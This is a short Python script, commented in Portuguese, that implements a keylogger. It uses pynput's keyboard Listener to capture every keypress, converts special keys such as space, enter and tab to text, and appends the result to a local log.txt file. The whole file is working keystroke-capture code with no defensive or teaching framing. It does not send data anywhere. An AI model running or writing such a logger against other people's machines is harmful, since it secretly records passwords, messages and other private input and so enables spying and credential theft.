#em pynput, importar o método Listener do teclado
from pynput.keyboard import Listener

#definir a localização do arquivo de log
logFile = "./log.txt"

#escreve no arquivo
def writeLog(key):
    #abre o arquivo de log no modo append e tenta escrever
    with open(logFile, "a") as f:
        f.write(trataKey(key))

def trataKey(key):
    # converter a tecla pressionada para string
    keydata = str(key)

    # remover as aspas da tecla pressionada
    keydata = keydata.replace("'", "")

    translate_keys = {
        "Key.space": " ",
        "Key.shift_r": "",
        "Key.shift_l": "",
        "Key.enter": "\n",
        "Key.esc": "",
        "Key.cmd": "",
        "Key.caps_lock": "",
        "Key.tab": "    "
    }

    # substitui a tecla pressionada de acordo com o mapeamento
    for key in translate_keys:
        keydata = keydata.replace(key, translate_keys[key])

    return keydata

#abrir o Listener do teclado e escutar o evento on_press
#quando o evento on_press ocorrer, chamar a função writeLog
with Listener(on_press=writeLog) as l:
    l.join()
